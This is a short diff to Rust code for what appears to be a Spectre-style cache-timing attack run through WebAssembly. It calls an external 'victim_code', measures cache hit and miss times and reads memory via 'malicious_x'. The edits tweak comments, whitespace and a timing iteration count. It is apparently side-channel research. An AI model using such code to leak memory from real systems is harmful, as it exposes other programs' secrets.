@@ -21,7 +21,6 @@ extern "C" {
 
     // Pseudo victim code
     fn victim_code(index: u32);
-
     // TODO another Wasm code
     // fn sync_in_sibling()
 }
@@ -95,10 +94,10 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
             };
 
             // Call the victim code outside this binary
+            // This releases the PING lock
             unsafe {
                 victim_code(location as u32);
             }
-            
         }
         #[cfg(feature = "tracing")]
         println!("Measuring time now");
@@ -163,7 +162,7 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
 #[no_mangle]
 pub fn predict(pad: usize) {
 
-    let (hit, miss) = reproduction::get_cache_time(&array_for_prediction, 1000000);
+    let (hit, miss) = reproduction::get_cache_time(&array_for_prediction, 100000000);
     println!("Hit {} Miss {}", hit, miss);
 
     for j in 0..11 {
@@ -209,6 +208,5 @@ pub fn main() {
         public_data[15] = 16;
     }
 
-    eprintln!("Starting attack");
     predict(0);
 }
